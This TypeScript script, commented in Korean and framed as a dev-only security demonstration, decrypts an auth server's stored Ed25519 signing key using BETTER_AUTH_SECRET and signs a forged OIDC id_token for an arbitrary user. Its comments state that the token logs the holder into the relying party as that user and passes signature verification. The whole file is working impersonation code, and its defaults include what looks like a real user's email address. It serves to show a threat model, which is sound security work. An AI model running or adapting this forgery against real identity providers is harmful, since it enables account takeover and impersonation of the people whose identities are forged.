/**
 * ⚠️ 보안 시연용 스크립트. 운영 환경에서 절대 실행/배포하지 말 것.
 *
 * 목적: "DB + BETTER_AUTH_SECRET 두 가지를 동시에 가지면 임의 id_token 위조 가능"
 *       이라는 위협 모델을 본인 dev 환경에서 눈으로 확인하기 위함.
 *
 * 흐름:
 *   1) jwks 테이블의 암호화된 private_key 를 BETTER_AUTH_SECRET 으로 복호화
 *   2) 복호화된 Ed25519 JWK 로 임의 claims (sub/email/...) JWT 서명
 *   3) 결과 id_token 을 출력
 *      → 이걸 nook RP 에 그대로 넘기면 "그 사용자로 로그인된 것처럼" 동작.
 *      → jwt.io 에 붙여넣으면 디코드되고, /api/auth/jwks 공개키로 검증도 통과.
 */
import 'dotenv/config';
import { importJWK, SignJWT } from 'jose';

import { db, sql } from '../src/database/client';
import { jwks } from '../src/database/schema';
// better-auth 내부 crypto 의 symmetricDecrypt 를 그대로 이용
// (운영 코드 어디에도 노출 안 되는 internal 이지만 노드 모듈로 import 가능)
import { symmetricDecrypt } from 'better-auth/crypto';

const SECRET = process.env.BETTER_AUTH_SECRET;
if (!SECRET) throw new Error('BETTER_AUTH_SECRET not set');

// 사칭할 사용자 정보. DB 의 어떤 user 의 id 를 sub 로 박아도 IdP/RP 가 그 사람으로 인식.
const TARGET_SUB = process.env.FORGE_SUB ?? 'DPFFEjrvhE3795hShRrIKLoNvObblocm';
const TARGET_EMAIL = process.env.FORGE_EMAIL ?? 'wndtlr1024@gmail.com';
const TARGET_NAME = process.env.FORGE_NAME ?? 'Forged User';

const ISSUER = 'http://localhost:3001/api/auth';
const AUDIENCE = 'skiiXbLedgnsTGGbukgHmZkgFQXMDwog'; // nook client_id

async function main(): Promise<void> {
  // 1) 암호화된 JWK 읽기
  const [row] = await db.select().from(jwks).limit(1);
  if (!row) throw new Error('no jwks row');

  // DB 의 private_key 는 JSON 문자열 ("...hex..."). JSON.parse 로 hex 만 추출.
  const encryptedHex = JSON.parse(row.privateKey) as string;

  // 2) BETTER_AUTH_SECRET 으로 복호화
  const decryptedJWKString = (await symmetricDecrypt({
    key: SECRET,
    data: encryptedHex,
  })) as string;
  const privateJWK = JSON.parse(decryptedJWKString) as Record<string, unknown>;

  console.log('=== 복호화된 private JWK ===');
  console.log({ kid: row.id, kty: privateJWK.kty, crv: privateJWK.crv });

  // 3) jose 로 임의 claims JWT 서명
  const privateKey = await importJWK(privateJWK, 'EdDSA');
  const now = Math.floor(Date.now() / 1000);

  const forgedToken = await new SignJWT({
    email: TARGET_EMAIL,
    email_verified: true,
    name: TARGET_NAME,
  })
    .setProtectedHeader({ alg: 'EdDSA', kid: row.id })
    .setIssuer(ISSUER)
    .setSubject(TARGET_SUB)
    .setAudience(AUDIENCE)
    .setIssuedAt(now)
    .setExpirationTime(now + 3600)
    .sign(privateKey);

  console.log('\n=== 위조된 id_token (jwt.io 에 붙여넣으세요) ===');
  console.log(forgedToken);
  console.log('\n검증 방법:');
  console.log('  curl http://localhost:3001/api/auth/jwks  ← 진짜 IdP 공개키');
  console.log(
    '  jwt.io 의 verify signature 에 그 공개키 넣어보면 valid 라고 표시됨.',
  );
  console.log('  → IdP 자기 자신도 "내가 발급한 토큰" 으로 인식.\n');
}

main()
  .catch((err) => {
    console.error('forge failed:', err);
    process.exitCode = 1;
  })
  .finally(async () => {
    await sql.end({ timeout: 5 });
  });
